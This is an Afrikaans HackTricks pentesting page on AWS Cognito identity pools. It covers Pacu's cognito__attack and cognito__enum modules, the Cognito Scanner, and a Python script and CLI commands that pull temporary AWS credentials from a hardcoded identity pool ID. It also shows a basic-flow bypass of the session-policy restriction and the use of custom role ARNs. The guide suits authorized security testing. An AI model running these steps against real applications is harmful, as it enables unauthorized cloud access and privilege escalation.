# Cognito Identiteitspoelen

{% hint style="success" %}
Leer & oefen AWS Hack: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Basiese Inligting

Identiteitspoelen speel 'n belangrike rol deur jou gebruikers in staat te stel om **tydelike geloofsbriewe te bekom**. Hierdie geloofsbriewe is noodsaaklik vir die toegang tot verskeie AWS-diens, insluitend maar nie beperk tot Amazon S3 en DynamoDB. 'n Merkwaardige kenmerk van identiteitspoelen is hul ondersteuning vir beide anonieme gasgebruikers en 'n verskeidenheid identiteitsverskaffers vir gebruikersverifikasie. Die ondersteunde identiteitsverskaffers sluit in:

- Amazon Cognito-gebruikerspoelen
- Sosiale aanmeldingsopsies soos Facebook, Google, Aanmelding met Amazon, en Aanmelding met Apple
- Verskaffers wat voldoen aan OpenID Connect (OIDC)
- SAML (Security Assertion Markup Language) identiteitsverskaffers
- Ontwikkelaar-geverifieerde identiteite
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Om Identiteit Poel-sessies te genereer, moet jy eers 'n **Identiteit ID genereer**. Hierdie Identiteit ID is die **identifikasie van die sessie van daardie gebruiker**. Hierdie identifikasies kan tot 20 datastelle h√™ wat tot 1MB van sleutel-waarde pare kan stoor.

Dit is **nuttig om inligting van 'n gebruiker te behou** (wat altyd dieselfde Identiteit ID sal gebruik).

Verder is die diens **cognito-sync** die diens wat toelaat om hierdie inligting te **bestuur en te sinchroniseer** (in die datastelle, stuur inligting in strome en SNS-boodskappe...).

### Gereedskap vir pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), die AWS-uitbuitingsraamwerk, sluit nou die "cognito\_\_enum" en "cognito\_\_attack" modules in wat outomatiese opname van alle Cognito-bates in 'n rekening en swak konfigurasies, gebruikerkenmerke wat vir toegangsbeheer gebruik word, ens., en ook outomatiese gebruikerskepping (insluitend MFA-ondersteuning) en voorreg-escalasie gebaseer op aanpasbare gebruikerskenmerke, bruikbare identiteitspoelgelde, aanneembare rolle in id-tokens, ens.

Vir 'n beskrywing van die funksies van die modules, sien deel 2 van die [blogpos](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Vir installeringinstruksies, sien die hoof [Pacu](https://github.com/RhinoSecurityLabs/pacu)-bladsy.

#### Gebruik

Voorbeeld cognito\_\_attack-gebruik om gebruikerskepping te probeer en alle privilige-vektore teen 'n gegewe identiteitspoel en gebruikerspoelklient:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Voorbeeld van cognito\_\_enum-gebruik om alle gebruikerspools, gebruikerspoolklante, identiteitspools, gebruikers, ens. te versamel wat sigbaar is in die huidige AWS-rekening:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) is 'n CLI-werktuig in Python wat verskillende aanvalle op Cognito implementeer, insluitend ongewenste rekening skepping en identiteitspoel eskalasie.

#### Installasie
```bash
$ pip install cognito-scanner
```
#### Gebruik
```bash
$ cognito-scanner --help
```
Vir meer inligting besoek https://github.com/padok-team/cognito-scanner

## Toegang tot IAM-rolle

### Ongeverifieer

Die enigste ding wat 'n aanvaller moet weet om **AWS-legitimasie** in 'n Cognito-toep as 'n ongeverifieerde gebruiker te kry, is die **Identiteitspoel-ID**, en hierdie **ID moet hardgekoppel** wees in die web-/mobiele **toepassing** sodat dit dit kan gebruik. 'n ID lyk soos dit: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (dit kan nie met geweld aangeval word nie).

{% hint style="success" %}
Die **IAM Cognito ongeverifieerde rol wat geskep is via** word standaard `Cognito_<Identiteitspoelnaam>Unauth_Role` genoem
{% endhint %}

As jy 'n Identiteitspoel-ID vind wat hardgekoppel is en dit ongeverifieerde gebruikers toelaat, kan jy AWS-legitimasie kry met:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Of jy kan die volgende **aws cli-opdragte** gebruik:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Let wel dat 'n ongeverifieerde Cognito **gebruiker NIE enige toestemming kan h√™ nie, selfs al is dit toegewys deur 'n beleid**. Kontroleer die volgende afdeling.
{% endhint %}

### Verbeterde vs Basiese Verifikasievloei

Die vorige afdeling het die **verstek verbeterde verifikasievloei** gevolg. Hierdie vloei stel 'n **beperkende** [**sessiebeleid**](../../aws-basic-information/#session-policies) in vir die IAM rol sessie wat gegenereer is. Hierdie beleid sal slegs die sessie toelaat om [**die dienste van hierdie lys te gebruik**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (selfs al het die rol toegang tot ander dienste).

Daar is egter 'n manier om hierdie te omseil, as die **Identiteitspoel "Basiese (Klassieke) Vloei" geaktiveer het**, sal die gebruiker in staat wees om 'n sessie te verkry deur daardie vloei te gebruik wat **nie daardie beperkende sessiebeleid sal h√™ nie**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
As jy hierdie **fout** ontvang, is dit omdat die **basiese vloei nie geaktiveer is (verstek)**

`'n Fout het voorgekom (InvalidParameterException) tydens die aanroep van die GetOpenIdToken operasie: Basiese (klassieke) vloei is nie geaktiveer nie, gebruik asseblief verbeterde vloei.`
{% endhint %}

Met 'n stel IAM-legitimasie moet jy [ondersoek watter toegang jy het](../../#whoami) en probeer [voorregte eskaleer](../../aws-privilege-escalation/).

### Ge√Ødentifiseer

{% hint style="info" %}
Onthou dat **ge√Ødentifiseerde gebruikers** waarskynlik **verskillende regte** sal kry, so as jy **binne die app kan registreer**, probeer dit en kry die nuwe legitimasie.
{% endhint %}

Daar kan ook **rolle** beskikbaar wees vir **ge√Ødentifiseerde gebruikers wat die Identiteitspoel benader**.

Hiervoor mag jy toegang tot die **identiteitsverskaffer** nodig h√™. As dit 'n **Cognito-gebruikerspoel** is, kan jy miskien die verstekgedrag misbruik en **self 'n nuwe gebruiker skep**.

{% hint style="success" %}
Die **IAM Cognito ge√Ødentifiseerde rol wat geskep is via** is standaard `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

Hoe dan ook, die **volgende voorbeeld** verwag dat jy reeds ingeteken het in 'n **Cognito-gebruikerspoel** wat gebruik word om die Identiteitspoel te benader (moet nie vergeet dat ander tipes identiteitsverskaffers ook opgestel kan wees).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Kry die identiteit_id van die vorige opdrag se antwoord
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# In die IdToken kan jy rolle vind waarop 'n gebruiker toegang het as gevolg van Gebruikerspoelgroepe
# Gebruik die --custom-role-arn om legitimasie vir 'n spesifieke rol te kry
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Dit is moontlik om **verskillende IAM-rolle te konfigureer afhangende van die identiteitsverskaffer** waardeur die gebruiker ingeteken is of selfs net afhangend **van die gebruiker** (deur eise te gebruik). Daarom, as jy toegang het tot verskillende gebruikers deur dieselfde of verskillende verskaffers, mag dit die moeite werd wees om in te teken en die IAM-rolle van almal te benader.
{% endhint %}

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
